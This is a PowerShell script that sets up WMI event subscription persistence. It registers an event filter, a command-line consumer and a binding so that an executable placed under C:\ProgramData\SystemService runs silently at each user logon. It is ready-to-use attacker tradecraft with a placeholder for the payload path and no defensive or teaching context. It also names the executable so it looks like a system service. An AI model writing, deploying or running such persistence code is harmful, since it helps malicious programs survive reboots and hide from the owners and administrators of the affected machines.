# ========================
# WMI Event Subscription Persistence
# ========================

$exePath = "C:\ProgramData\SystemService\Hello-GPT.exe"  # Change to your EXE path
$filterName = "GPTEventFilter"
$consumerName = "GPTCommandConsumer"

try {
    # Create the Event Filter (runs when user logs in)
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = $filterName;
        EventNamespace = "root\cimv2";
        QueryLanguage = "WQL";
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
    }

    # Create the CommandLineEventConsumer
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = $consumerName;
        CommandLineTemplate = "`"$exePath`"";
        RunInteractively = $false
    }

    # Bind the Filter and Consumer
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter;
        Consumer = $consumer
    }

    Write-Output "✔️ WMI Event Subscription persistence added"
} catch {
    Write-Warning "❌ Failed to create WMI persistence: $_"
}
